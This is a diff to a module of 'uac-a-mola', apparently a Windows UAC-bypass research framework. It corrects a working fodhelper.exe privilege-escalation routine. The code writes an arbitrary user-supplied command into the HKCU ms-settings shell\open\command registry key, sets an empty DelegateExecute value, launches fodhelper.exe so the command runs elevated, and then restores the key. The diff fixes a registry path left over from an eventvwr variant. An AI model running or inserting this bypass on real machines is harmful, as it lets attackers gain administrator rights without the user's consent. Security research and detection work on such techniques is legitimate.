@@ -1,3 +1,5 @@
+#--encoding: utf-8--
+
 # This file is part of uac-a-mola
 # Author: Santiago Hernández Ramos (shramos@protonmail.com)
 #
@@ -35,12 +37,12 @@ class CustomModule(Module):
         k = self.reg.create_key(HKCU,"Software\\Classes\\ms-settings\\Shell\\Open\\command")
         print "Created hive"
         print "Setting 'Default'..."
-        self.reg.set_value(HKCU,"Software\\Classes\\mscfile\\shell\\open\\command", self.args["instruction"])
+        self.reg.set_value(HKCU,"Software\\Classes\\ms-settings\\shell\\open\\command", self.args["instruction"])
         print "Creating DelegateExecute Value"
         self.reg.create_value(k, "DelegateExecute", "")
         print "Done!"
-        print "Executing... eventvwr.exe"
-        os.system("c:\windows\system32\fodhelper.exe")
+        print "Executing... fodhelper.exe"
+        self.run_binary("C:\\Windows\\System32\\fodhelper.exe")
         print "Got it? :D"
         print "Now... Deleting hive!"
         self.reg.restore(k)
